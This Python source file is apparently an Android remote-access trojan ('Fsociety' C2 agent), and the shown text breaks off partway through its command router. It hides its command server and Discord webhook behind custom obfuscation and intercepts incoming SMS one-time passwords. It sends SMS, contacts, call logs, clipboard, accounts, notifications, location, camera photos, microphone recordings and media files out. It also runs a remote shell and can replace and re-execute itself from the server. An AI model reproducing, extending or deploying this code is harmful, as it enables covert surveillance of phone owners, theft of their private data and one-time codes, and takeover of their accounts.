"""
Fsociety APK Background Service v2.0 — Full-Featured C2 Agent
Fully crash-proofed for Android 13/14 compatibility.
All hardware calls use Android native Java APIs via pyjnius (no Termux dependency).
"""
import sys, os, subprocess, time, json, zipfile, platform, traceback

# ========================= CONFIGURATION =========================
def _xd(d, s="k3ycu5t0m", r=4):
    import hashlib
    if not d or len(d) < 2: return ""
    SB = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    IS = [0]*256; [IS.__setitem__(v, i) for i, v in enumerate(SB)]
    sd = s.encode(); ks = []
    for _ in range(r): sd = hashlib.sha256(sd).digest(); ks.append(sd)
    raw = list(d); pc = [ks[-1][0]]
    for i in range(len(raw)):
        cur = raw[i]; raw[i] = (raw[i] - ks[2][i % len(ks[2])]) & 0xFF
        raw[i] ^= pc[-1]; pc.append(cur)
    m = len(raw) // 2; left, right = raw[:m], raw[m:]
    for rd in range(r - 1, -1, -1):
        rk = ks[rd % len(ks)]
        mx = [SB[(b ^ rk[i % len(rk)]) & 0xFF] for i, b in enumerate(left)]
        right = [b ^ x for b, x in zip(right, mx)]; left, right = right, left
    raw = left + right; n = len(raw); rs = int.from_bytes(ks[1][:8], 'big'); sw = []
    for i in range(n - 1, 0, -1):
        rs = (rs * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
        sw.append((i, rs % (i + 1)))
    for i, j in reversed(sw): raw[i], raw[j] = raw[j], raw[i]
    for i in range(len(raw)):
        k = ks[0][i % len(ks[0])]
        rt = (i + k) % 8; raw[i] = ((raw[i] >> rt) | (raw[i] << (8 - rt))) & 0xFF
        raw[i] = IS[(raw[i] ^ k) & 0xFF]
    ol = (raw[-2] << 8) | raw[-1]
    return bytes(raw[:ol]).decode()

# Use obfuscator.py to generate your byte arrays
_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE
C2_URL = _xd(_C2_ENC)
_WH_ENC = bytes([0x00])
DISCORD_WEBHOOK_URL = _xd(_WH_ENC)
HEARTBEAT_INTERVAL = 5
MAX_RETRY_INTERVAL = 60  # Max backoff for C2 reconnection

# ========================= SAFE IMPORTS =========================
# Import requests with fallback — don't crash if missing
try:
    import requests
except ImportError:
    requests = None

# ========================= ANDROID IMPORTS =========================
# Wrapped in try-except — EVERY autoclass can fail on certain devices
try:
    from jnius import autoclass, PythonJavaClass, java_method, cast
    PythonService = autoclass('org.kivy.android.PythonService')
    Context = autoclass('android.content.Context')
    Build = autoclass('android.os.Build')
    IntentFilter = autoclass('android.content.IntentFilter')
    Uri = autoclass('android.net.Uri')
    Environment = autoclass('android.os.Environment')
    ANDROID = True
except Exception:
    ANDROID = False

# ========================= DEBUG LOGGER =========================
def _log(msg, level="INFO"):
    """Remote debug logger — sends to Discord for remote troubleshooting."""
    try:
        device = Build.MODEL if ANDROID else "UNKNOWN"
    except:
        device = "UNKNOWN"
    log_line = f"[{level}] `{device}`: {msg}"
    try:
        if requests:
            requests.post(DISCORD_WEBHOOK_URL,
                          json={'content': f"\U0001F527 {log_line}"},
                          headers={'ngrok-skip-browser-warning': '1'},
                          timeout=5)
    except:
        pass

# ========================= TEMP DIRECTORY =========================
def _get_temp_dir():
    """Get a writable temp directory — uses app-private dir on Android 13+."""
    try:
        if ANDROID:
            ctx = get_context()
            ext_dir = ctx.getExternalFilesDir(None)
            if ext_dir:
                path = ext_dir.getAbsolutePath()
                os.makedirs(path, exist_ok=True)
                return path
    except:
        pass
    # Fallback
    fallback = os.environ.get("EXTERNAL_STORAGE", "/sdcard")
    if os.path.exists(fallback):
        return fallback
    return "/tmp"

TEMP_DIR = None  # Initialized in start_service()

# ========================= HELPERS =========================

def get_context():
    return PythonService.mService

def post_output(client_id, cmd_id, command_line, output):
    if not requests:
        return
    try:
        short_out = (output[:500] + "...") if len(output) > 500 else output
        requests.post(f"{C2_URL}/report/{client_id}", 
                      json={'cmd_id': cmd_id, 'output': short_out}, 
                      headers={'ngrok-skip-browser-warning': '1'},
                      timeout=10)
    except:
        pass
    try:
        header = f"**[Result]** `{client_id[:8]}` (CMD: `{command_line}`)\n"
        if len(output) > 1900:
            temp_path = os.path.join(TEMP_DIR or "/sdcard", f"res_{cmd_id}.txt")
            with open(temp_path, "w", encoding="utf-8") as f:
                f.write(output)
            with open(temp_path, "rb") as f:
                requests.post(DISCORD_WEBHOOK_URL, 
                              data={"content": header}, 
                              headers={'ngrok-skip-browser-warning': '1'},
                              files={"file": (f"result_{cmd_id}.txt", f.read())})
            if os.path.exists(temp_path):
                os.remove(temp_path)
        else:
            requests.post(DISCORD_WEBHOOK_URL, 
                          json={"content": f"{header}```\n{output}\n```"},
                          headers={'ngrok-skip-browser-warning': '1'})
    except:
        pass

def exfiltrate_file(filepath, client_id=None, message=""):
    if not requests:
        return "Requests library not available."
    try:
        if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
            return f"File exfiltration failed: '{os.path.basename(filepath)}' is missing or empty."
        file_size = os.path.getsize(filepath)
        if file_size > 20_000_000 and client_id:
            with open(filepath, 'rb') as f:
                requests.post(f"{C2_URL}/loot/{client_id}", 
                              files={"file": (os.path.basename(filepath), f.read())}, 
                              headers={'ngrok-skip-browser-warning': '1'},
                              timeout=60)
            return f"File exported to C2 ({file_size/1e6:.1f}MB)."
        with open(filepath, 'rb') as f:
            r = requests.post(DISCORD_WEBHOOK_URL, data={"content": message}, files={"file": (os.path.basename(filepath), f.read())})
            if r.status_code >= 400 and client_id:
                f.seek(0)
                requests.post(f"{C2_URL}/loot/{client_id}", 
                              files={"file": (os.path.basename(filepath), f.read())}, 
                              headers={'ngrok-skip-browser-warning': '1'},
                              timeout=60)
                return f"Discord rejected. Exported to C2 ({file_size/1e6:.1f}MB)."
        return ""
    except Exception as e:
        return f"File exfiltration failed: {e}"

# ========================= STATEFUL SHELL =========================

class StatefulShell:
    def __init__(self):
        self.cwd = "/sdcard" if os.path.exists("/sdcard") else os.path.expanduser("~")

    def execute(self, command):
        command = command.strip()
        if not command:
            return ""
        if command.lower().startswith('cd '):
            try:
                new_dir = command[3:].strip()
                if not os.path.isabs(new_dir):
                    new_dir = os.path.join(self.cwd, new_dir)
                new_dir = os.path.abspath(new_dir)
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    self.cwd = os.getcwd()
                    return f"Changed directory to: {self.cwd}"
                return f"Error: Directory not found: {new_dir}"
            except Exception as e:
                return f"Error: {e}"
        try:
            result = subprocess.run(["/system/bin/sh", "-c", command], cwd=self.cwd,
                                    capture_output=True, text=True, errors='ignore', timeout=60)
            out = result.stdout + result.stderr
            return out if out.strip() else "Command executed (no output)."
        except subprocess.TimeoutExpired:
            return "Error: Command timed out (60s)."
        except Exception as e:
            return f"Error: {e}"

# ============================================================================
# LIVE OTP INTERCEPTOR (BroadcastReceiver)
# ============================================================================

# Only define if we have Android environment
if ANDROID:
    class SmsReceiver(PythonJavaClass):
        __javacontext__ = 'app'
        __javainterfaces__ = ['android/content/BroadcastReceiver']

        @java_method('(Landroid/content/Context;Landroid/content/Intent;)V')
        def onReceive(self, context, intent):
            try:
                Telephony = autoclass('android.provider.Telephony')
                messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                for msg in messages:
                    sender = msg.getOriginatingAddress()
                    body = msg.getMessageBody()
                    discord_msg = (
                        f"**[\U0001F4E8 OTP INTERCEPT]**\n"
                        f"**From:** `{sender}`\n"
                        f"**Message:**\n```\n{body}\n```"
                    )
                    if requests:
                        requests.post(DISCORD_WEBHOOK_URL, 
                                      json={'content': discord_msg}, 
                                      headers={'ngrok-skip-browser-warning': '1'},
                                      timeout=10)
            except Exception as e:
                _log(f"SMS receiver error: {e}", "WARN")

# ============================================================================
# HARDWARE FUNCTIONS (Android Native via Pyjnius)
# ============================================================================

def get_geolocation():
    """Get GPS location using Android LocationManager, fallback to IP."""
    try:
        ctx = get_context()
        LocationManager = autoclass('android.location.LocationManager')
        lm = cast('android.location.LocationManager', ctx.getSystemService(Context.LOCATION_SERVICE))

        # Try GPS, then Network
        for provider in ['gps', 'network']:
            try:
                loc = lm.getLastKnownLocation(provider)
                if loc:
                    lat, lon = loc.getLatitude(), loc.getLongitude()
                    acc = loc.getAccuracy()
                    return (f"Source: Android GPS (APK - {provider})\n"
                            f"Coords: Lat={lat}, Lon={lon}\n"
                            f"Accuracy: {acc}m\n"
                            f"Maps: https://maps.google.com/?q={lat},{lon}"), None
            except:
                continue
    except:
        pass

    # IP fallback
    try:
        if not requests:
            return None, "Geolocation failed: no requests library"
        r = requests.get('https://ipinfo.io/json', timeout=10)
        data = r.json()
        loc = data.get('loc', 'N/A').split(',')
        lat, lon = (loc[0], loc[1]) if len(loc) == 2 else ('N/A', 'N/A')
        return (f"Source: IP-based (INACCURATE)\nIP: {data.get('ip', 'N/A')}\n"
                f"Location: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}\n"
                f"Coords: Lat={lat}, Lon={lon}\nMaps: https://maps.google.com/?q={lat},{lon}"), None
    except Exception as e:
        return None, f"Geolocation failed: {e}"

def take_webcam_photo(camera_id=0):
    """Take photo using plyer camera API."""
    filepath = os.path.join(TEMP_DIR or "/sdcard", "cam.jpg")
    try:
        from plyer import camera as plyer_cam
        plyer_cam.take_picture(filename=filepath, on_complete=lambda x: None)
        time.sleep(5)  # Wait for capture
        if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
            return filepath, None
        return None, f"Camera {camera_id} capture timed out."
    except Exception as e:
        return None, f"Camera failed: {e}"

def record_audio(seconds=10):
    """Record audio using Android MediaRecorder."""
    filepath = os.path.join(TEMP_DIR or "/sdcard", "mic.3gp")
    try:
        MediaRecorder = autoclass('android.media.MediaRecorder')
        recorder = MediaRecorder()
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        recorder.setOutputFile(filepath)
        recorder.prepare()
        recorder.start()
        time.sleep(seconds)
        recorder.stop()
        recorder.release()
        if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
            return filepath, None
        return None, "Recording file empty."
    except Exception as e:
        return None, f"Audio recording failed: {e}"

def get_battery_info():
    """Get battery info using plyer."""
    try:
        from plyer import battery
        status = battery.status
        return (f"Level: {status.get('percentage', 'N/A')}%\n"
                f"Charging: {status.get('isCharging', 'N/A')}"), None
    except Exception as e:
        return None, f"Battery info failed: {e}"

def get_sms_list(limit=10):
    """Read SMS inbox using Android ContentResolver."""
    try:
        ctx = get_context()
        cr = ctx.getContentResolver()
        uri = Uri.parse("content://sms/inbox")
        cursor = cr.query(uri, None, None, None, "date DESC")

        results = []
        count = 0
        if cursor and cursor.moveToFirst():
            while count < limit:
                try:
                    addr = cursor.getString(cursor.getColumnIndex("address"))
                    body = cursor.getString(cursor.getColumnIndex("body"))
                    date = cursor.getString(cursor.getColumnIndex("date"))
                    results.append(f"From: {addr}\nDate: {date}\nBody: {body}\n---")
                except:
                    pass
                count += 1
                if not cursor.moveToNext():
                    break
            cursor.close()

        return ("\n".join(results) if results else "No SMS found or permission denied."), None
    except Exception as e:
        return None, f"SMS access failed: {e}"

def get_contacts():
    """Read contacts using Android ContentResolver."""
    try:
        ctx = get_context()
        cr = ctx.getContentResolver()
        ContactsContract = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
        uri = ContactsContract.CONTENT_URI
        cursor = cr.query(uri, None, None, None, None)

        results = []
        if cursor and cursor.moveToFirst():
            while True:
                try:
                    name = cursor.getString(cursor.getColumnIndex(ContactsContract.DISPLAY_NAME))
                    number = cursor.getString(cursor.getColumnIndex(ContactsContract.NUMBER))
                    results.append(f"{name}: {number}")
                except:
                    pass
                if not cursor.moveToNext():
                    break
            cursor.close()

        return ("\n".join(results) if results else "No contacts found."), None
    except Exception as e:
        return None, f"Contacts access failed: {e}"

def get_clipboard():
    """Read clipboard using Android ClipboardManager."""
    try:
        ctx = get_context()
        ClipboardManager = autoclass('android.content.ClipboardManager')
        cm = cast('android.content.ClipboardManager', ctx.getSystemService(Context.CLIPBOARD_SERVICE))
        if cm.hasPrimaryClip():
            clip = cm.getPrimaryClip()
            if clip.getItemCount() > 0:
                text = clip.getItemAt(0).coerceToText(ctx).toString()
                return (text if text else "(clipboard empty)"), None
        return "(clipboard empty)", None
    except Exception as e:
        return None, f"Clipboard failed: {e}"

def vibrate_device(duration_ms=500):
    """Vibrate using Android Vibrator service."""
    try:
        ctx = get_context()
        Vibrator = autoclass('android.os.Vibrator')
        vibrator = cast('android.os.Vibrator', ctx.getSystemService(Context.VIBRATOR_SERVICE))
        vibrator.vibrate(int(duration_ms))
        return "Device vibrated.", None
    except Exception as e:
        return None, f"Vibrate failed: {e}"

def send_toast(message):
    """Show toast message on screen."""
    try:
        from android.runnable import run_on_ui_thread
        Toast = autoclass('android.widget.Toast')
        ctx = get_context()

        @run_on_ui_thread
        def show():
            Toast.makeText(ctx, message, Toast.LENGTH_LONG).show()
        show()
        return "Toast displayed on target.", None
    except Exception as e:
        return None, f"Toast failed: {e}"

def get_call_log(limit=20):
    """Read call log using Android ContentResolver."""
    try:
        ctx = get_context()
        cr = ctx.getContentResolver()
        CallLog = autoclass('android.provider.CallLog$Calls')
        uri = CallLog.CONTENT_URI
        cursor = cr.query(uri, None, None, None, "date DESC")

        results = []
        count = 0
        type_map = {1: "Incoming", 2: "Outgoing", 3: "Missed"}

        if cursor and cursor.moveToFirst():
            while count < limit:
                try:
                    number = cursor.getString(cursor.getColumnIndex(CallLog.NUMBER))
                    call_type = cursor.getInt(cursor.getColumnIndex(CallLog.TYPE))
                    duration = cursor.getString(cursor.getColumnIndex(CallLog.DURATION))
                    date = cursor.getString(cursor.getColumnIndex(CallLog.DATE))
                    type_str = type_map.get(call_type, "Unknown")
                    results.append(f"{type_str:10s} | {number:15s} | {duration}s | {date}")
                except:
                    pass
                count += 1
                if not cursor.moveToNext():
                    break
            cursor.close()

        return ("\n".join(results) if results else "No call logs found."), None
    except Exception as e:
        return None, f"Call log failed: {e}"

def get_sim_info():
    """Get SIM/Telephony info using TelephonyManager."""
    try:
        ctx = get_context()
        TelephonyManager = autoclass('android.telephony.TelephonyManager')
        tm = cast('android.telephony.TelephonyManager', ctx.getSystemService(Context.TELEPHONY_SERVICE))

        info = (
            f"Network Operator: {tm.getNetworkOperatorName()}\n"
            f"SIM Operator: {tm.getSimOperatorName()}\n"
            f"SIM State: {tm.getSimState()}\n"
            f"Phone Type: {tm.getPhoneType()}\n"
            f"Network Type: {tm.getNetworkType()}"
        )
        # getLine1Number may fail on newer Android
        try:
            info += f"\nPhone Number: {tm.getLine1Number()}"
        except:
            info += "\nPhone Number: Not available"
        return info, None
    except Exception as e:
        return None, f"SIM info failed: {e}"

def get_wifi_info():
    """Get WiFi connection info using WifiManager."""
    try:
        ctx = get_context()
        WifiManager = autoclass('android.net.wifi.WifiManager')
        wm = cast('android.net.wifi.WifiManager', ctx.getSystemService(Context.WIFI_SERVICE))
        info = wm.getConnectionInfo()

        ssid = info.getSSID()
        ip_int = info.getIpAddress()
        ip = f"{ip_int & 0xff}.{(ip_int >> 8) & 0xff}.{(ip_int >> 16) & 0xff}.{(ip_int >> 24) & 0xff}"
        mac = info.getMacAddress()
        speed = info.getLinkSpeed()

        return f"WiFi: {ssid}\nIP: {ip}\nMAC: {mac}\nSpeed: {speed} Mbps", None
    except Exception as e:
        return None, f"WiFi info failed: {e}"

def get_installed_apps():
    """List user-installed apps using PackageManager."""
    try:
        ctx = get_context()
        pm = ctx.getPackageManager()
        ApplicationInfo = autoclass('android.content.pm.ApplicationInfo')
        packages = pm.getInstalledApplications(0)

        apps = []
        for i in range(packages.size()):
            app = packages.get(i)
            # Only non-system (user-installed) apps
            if (app.flags & ApplicationInfo.FLAG_SYSTEM) == 0:
                apps.append(app.packageName)

        return ("\n".join(sorted(apps)) if apps else "No user apps found."), None
    except Exception as e:
        return None, f"Apps listing failed: {e}"

def get_sensor_data():
    """Read sensor data using Android SensorManager."""
    try:
        ctx = get_context()
        SensorManager = autoclass('android.hardware.SensorManager')
        Sensor = autoclass('android.hardware.Sensor')
        sm = cast('android.hardware.SensorManager', ctx.getSystemService(Context.SENSOR_SERVICE))

        results = []
        sensor_types = {
            "Light": Sensor.TYPE_LIGHT,
            "Proximity": Sensor.TYPE_PROXIMITY,
            "Accelerometer": Sensor.TYPE_ACCELEROMETER
        }
        for name, stype in sensor_types.items():
            sensor = sm.getDefaultSensor(stype)
            if sensor:
                results.append(f"{name}: Available (max range: {sensor.getMaximumRange()})")
            else:
                results.append(f"{name}: Not available")

        return ("\n".join(results) if results else "No sensors detected."), None
    except Exception as e:
        return None, f"Sensor access failed: {e}"

def steal_media(limit_str):
    """Steal photos/downloads from device storage."""
    try:
        storage = Environment.getExternalStorageDirectory().getAbsolutePath()
    except:
        storage = "/sdcard"

    targets = [
        os.path.join(storage, "DCIM/Camera"),
        os.path.join(storage, "Download"),
        os.path.join(storage, "Pictures")
    ]

    all_files = []
    for t in targets:
        if not os.path.exists(t):
            continue
        for root, dirs, files in os.walk(t):
            for file in files:
                ext = file.lower().split('.')[-1]
                if ext in ['jpg', 'jpeg', 'png', 'mp4', 'pdf', 'zip']:
                    full_path = os.path.join(root, file)
                    try:
                        all_files.append((full_path, os.path.getmtime(full_path)))
                    except:
                        pass

    all_files.sort(key=lambda x: x[1], reverse=True)
    if not all_files:
        return None, "No media files found."

    if limit_str.lower() == "all":
        limit = 200
    else:
        try:
            limit = int(limit_str)
        except:
            limit = 5

    if limit == 1:
        return all_files[0][0], None

    zip_path = os.path.join(TEMP_DIR or "/sdcard", "media_loot.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filepath, _ in all_files[:limit]:
                zipf.write(filepath, arcname=os.path.basename(filepath))
        return zip_path, None
    except Exception as e:
        return None, f"Zipping failed: {e}"

def take_screenshot():
    """Screenshot — requires root on Android."""
    filepath = os.path.join(TEMP_DIR or "/sdcard", "ss.png")
    try:
        result = subprocess.run(["/system/bin/sh", "-c", f"screencap -p {filepath}"],
                                capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and os.path.exists(filepath):
            return filepath, None
        return None, "Screenshot requires ROOT. Device is not rooted."
    except Exception as e:
        return None, f"Screenshot failed: {e}"

def steal_accounts():
    """List all accounts registered on the device using AccountManager."""
    try:
        ctx = get_context()
        AccountManager = autoclass('android.accounts.AccountManager')
        am = AccountManager.get(ctx)
        accounts = am.getAccounts()

        results = []
        for i in range(len(accounts)):
            acc = accounts[i]
            acc_name = acc.name
            acc_type = acc.type
            results.append(f"{acc_type:35s} | {acc_name}")

        if results:
            header = f"=== Registered Accounts ({len(results)}) ===\n"
            header += f"{'Type':35s} | Name\n"
            header += "-" * 60 + "\n"
            return header + "\n".join(results), None
        return "No accounts found on device.", None
    except Exception as e:
        return None, f"Account enumeration failed: {e}. Need GET_ACCOUNTS permission."

def steal_notifications():
    """Read recent notification history (limited without root)."""
    try:
        result = subprocess.run(["/system/bin/sh", "-c", "dumpsys notification --noredact 2>/dev/null | head -500"],
                                capture_output=True, text=True, timeout=15)
        if result.stdout.strip():
            return result.stdout.strip(), None
        return None, "Notification access denied. Need NotificationListenerService permission."
    except Exception as e:
        return None, f"Notification access failed: {e}"

def get_device_info():
    """Comprehensive device fingerprint."""
    try:
        info = (
            f"=== Device Info ===\n"
            f"Model: {Build.MODEL}\n"
            f"Brand: {Build.BRAND}\n"
            f"Manufacturer: {Build.MANUFACTURER}\n"
            f"Device: {Build.DEVICE}\n"
            f"Product: {Build.PRODUCT}\n"
            f"Android: {Build.VERSION.RELEASE}\n"
            f"SDK: {Build.VERSION.SDK_INT}\n"
            f"Board: {Build.BOARD}\n"
            f"Hardware: {Build.HARDWARE}\n"
            f"Serial: {Build.SERIAL if hasattr(Build, 'SERIAL') else 'N/A'}\n"
            f"Fingerprint: {Build.FINGERPRINT}\n"
        )
        return info, None
    except Exception as e:
        return None, f"Device info failed: {e}"

# ============================================================================
# MAIN SERVICE LOOP (C2 Communication + Command Router)
# ============================================================================

def start_service():
    global TEMP_DIR

    # === PHASE 1: Service Initialization ===
    try:
        service = PythonService.mService
        service.setAutoRestartService(True)
        _log("Service started successfully")
    except Exception as e:
        _log(f"CRITICAL: Service init failed: {e}", "ERROR")
        return

    # Initialize temp directory
    TEMP_DIR = _get_temp_dir()
    _log(f"Temp dir: {TEMP_DIR}")

    # === PHASE 2: Register Live OTP Interceptor ===
    try:
        receiver = SmsReceiver()
        intent_filter = IntentFilter('android.provider.Telephony.SMS_RECEIVED')
        intent_filter.setPriority(2147483647)  # Max priority

        # Android 14+ requires RECEIVER_EXPORTED flag
        sdk_version = Build.VERSION.SDK_INT
        if sdk_version >= 34:
            # Context.RECEIVER_EXPORTED = 2
            service.registerReceiver(receiver, intent_filter, 2)
            _log("OTP Interceptor: EXPORTED mode (Android 14+)")
        elif sdk_version >= 33:
            # Android 13: try with flag, fallback without
            try:
                service.registerReceiver(receiver, intent_filter, 2)
                _log("OTP Interceptor: EXPORTED mode (Android 13)")
            except:
                service.registerReceiver(receiver, intent_filter)
                _log("OTP Interceptor: Legacy mode (Android 13 fallback)")
        else:
            service.registerReceiver(receiver, intent_filter)
            _log("OTP Interceptor: Legacy mode")
    except Exception as e:
        _log(f"OTP Interceptor failed (non-fatal): {e}", "WARN")

    # === PHASE 3: Notify Discord ===
    os_info = f"Android {Build.VERSION.RELEASE} (APK)"
    device_model = Build.MODEL
    try:
        if requests:
            requests.post(DISCORD_WEBHOOK_URL, json={
                'content': (
                    f"**[\U0001F4F1 APK INSTALLED]** `{device_model}` running Android {Build.VERSION.RELEASE}\n"
                    f"SDK: {Build.VERSION.SDK_INT} | Brand: {Build.BRAND}\n"
                    f"OTP Interceptor: \u2705 Registered\n"
                    f"Temp Dir: `{TEMP_DIR}`"
                )
            }, headers={'ngrok-skip-browser-warning': '1'}, timeout=10)
    except Exception as e:
        _log(f"Discord notify failed: {e}", "WARN")

    # === PHASE 4: C2 Loop ===
    shell = StatefulShell()
    retry_interval = HEARTBEAT_INTERVAL

    while True:
        # --- Registration Loop ---
        client_id = None
        while not client_id:
            try:
                if not requests:
                    _log("CRITICAL: requests library unavailable", "ERROR")
                    time.sleep(30)
                    continue
                r = requests.post(f"{C2_URL}/register", 
                                 json={'os_info': os_info}, 
                                 headers={'ngrok-skip-browser-warning': '1'},
                                 timeout=10)
                r.raise_for_status()
                client_id = r.json().get('client_id')
                if client_id:
                    retry_interval = HEARTBEAT_INTERVAL  # Reset backoff
                    _log(f"Registered with C2: {client_id[:8]}")
            except Exception:
                time.sleep(retry_interval)
                retry_interval = min(retry_interval * 1.5, MAX_RETRY_INTERVAL)

        # --- Heartbeat Loop ---
        while True:
            try:
                r = requests.post(f"{C2_URL}/heartbeat/{client_id}", 
                                 json={'cwd': shell.cwd}, 
                                 headers={'ngrok-skip-browser-warning': '1'},
                                 timeout=10)
                r.raise_for_status()
                tasks = r.json().get('tasks', [])
                retry_interval = HEARTBEAT_INTERVAL  # Reset backoff

                for task in tasks:
                    try:
                        cmd_id = task.get('cmd_id')
                        command_line = task.get('command', '').strip()
                        if not command_line:
                            continue
                        parts = command_line.split()
                        cmd = parts[0].lower()
                        output = ""

                        # === COMMAND ROUTER ===

                        if cmd in ["geolocate", "geo"]:
                            report, err = get_geolocation()
                            output = err if err else report

                        elif cmd in ["screenshot", "ss"]:
                            filepath, err = take_screenshot()
                            output = err if err else exfiltrate_file(filepath, client_id, f"Screenshot: `{client_id}`")

                        elif cmd in ["webcam", "wc"]:
                            cam_id = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                            filepath, err = take_webcam_photo(cam_id)
                            output = err if err else exfiltrate_file(filepath, client_id, f"APK Cam{cam_id}: `{client_id}`")

                        elif cmd in ["record_audio", "rec_a"]:
                            seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                            filepath, err = record_audio(seconds)
                            output = err if err else exfiltrate_file(filepath, client_id, f"APK Audio ({seconds}s): `{client_id}`")

                        elif cmd in ["export", "exp"]:
                            filepath = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                            output = exfiltrate_file(filepath, client_id, f"Export: `{filepath}`") if filepath else "Error: filename required."

                        elif cmd == "sys_upload":
                            filename = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                            if filename:
                                try:
                                    r2 = requests.get(f"{C2_URL}/serve/{filename}", timeout=30)
                                    if r2.status_code == 200:
                                        save_path = os.path.join(shell.cwd, filename)
                                        with open(save_path, "wb") as f:
                                            f.write(r2.content)
                                        output = f"Uploaded `{filename}` to `{shell.cwd}`."
                                    else:
                                        output = f"Failed to download {filename} from C2."
                                except Exception as e:
                                    output = f"sys_upload error: {e}"
                            else:
                                output = "sys_upload error: no filename"

                        elif cmd == "battery":
                            report, err = get_battery_info()
                            output = err if err else report

                        elif cmd == "sms":
                            limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                            report, err = get_sms_list(limit)
                            output = err if err else report

                        elif cmd == "contacts":
                            report, err = get_contacts()
                            output = err if err else report

                        elif cmd == "clipboard":
                            report, err = get_clipboard()
                            output = err if err else report

                        elif cmd == "vibrate":
                            ms = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 500
                            report, err = vibrate_device(ms)
                            output = err if err else report

                        elif cmd == "toast":
                            msg = command_line.split(maxsplit=1)[1] if len(parts) > 1 else "Hello from Fsociety"
                            report, err = send_toast(msg)
                            output = err if err else report

                        elif cmd == "callog":
                            limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
                            report, err = get_call_log(limit)
                            output = err if err else report

                        elif cmd == "sim_info":
                            report, err = get_sim_info()
                            output = err if err else report

                        elif cmd == "wifi_info":
                            report, err = get_wifi_info()
                            output = err if err else report

                        elif cmd == "apps":
                            report, err = get_installed_apps()
                            output = err if err else report

                        elif cmd == "sensor":
                            report, err = get_sensor_data()
                            output = err if err else report

                        elif cmd == "devinfo":
                            report, err = get_device_info()
                            output = err if err else report

                        elif cmd == "steal" and len(parts) >= 2:
                            sub = parts[1].lower()
                            if sub == "media":
                                limit_str = parts[2] if len(parts) > 2 else "5"
                                filepath, err = steal_media(limit_str)
                                if err:
                                    output = err
                                else:
                                    output = exfiltrate_file(filepath, client_id, f"APK Media Loot (`{limit_str}` files) from `{client_id}`")
                            elif sub == "accounts":
                                report, err = steal_accounts()
                                output = err if err else report
                            elif sub == "notif":
                                report, err = steal_notifications()
                                output = err if err else report
                            else:
                                output = f"Unknown steal target: {sub}. Use: steal media/accounts/notif"

                        elif cmd == "sys_update":
                            try:
                                r3 = requests.get(f"{C2_URL}/update", timeout=30)
                                if r3.status_code == 200:
                                    script_path = os.path.abspath(sys.argv[0])
                                    with open(script_path, 'w', encoding='utf-8') as f:
                                        f.write(r3.text)
                                    output = "Service updated. Restarting..."
                                    os.execv(sys.executable, [sys.executable, script_path])
                                else:
                                    output = f"C2 returned {r3.status_code}. No update available."
                            except Exception as e:
                                output = f"Self-update failed: {e}"

                        elif cmd == "ping":
                            output = f"PONG from {device_model} | Android {Build.VERSION.RELEASE} | SDK {Build.VERSION.SDK_INT}"

                        elif cmd == "diag":
                            # Diagnostic command — reports service health
                            output = (
                                f"=== Diagnostic Report ===\n"
                                f"Device: {device_model} ({Build.BRAND})\n"
